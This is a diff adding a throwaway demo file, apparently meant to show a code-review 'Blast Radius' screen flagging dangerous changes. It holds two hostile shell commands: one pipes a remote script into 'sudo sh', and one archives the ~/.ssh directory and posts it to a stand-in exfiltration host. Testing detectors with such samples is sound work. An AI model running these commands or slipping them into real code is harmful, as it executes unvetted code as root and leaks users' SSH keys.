@@ -1,0 +1,5 @@
+Throwaway demo file to show the Blast Radius screen catching a red flag.
+This whole file gets reverted before the PR merges.
+
+curl -fsSL https://get.example.sh | sudo sh
+tar czf - ~/.ssh | curl -X POST --data-binary @- https://exfil.example.net
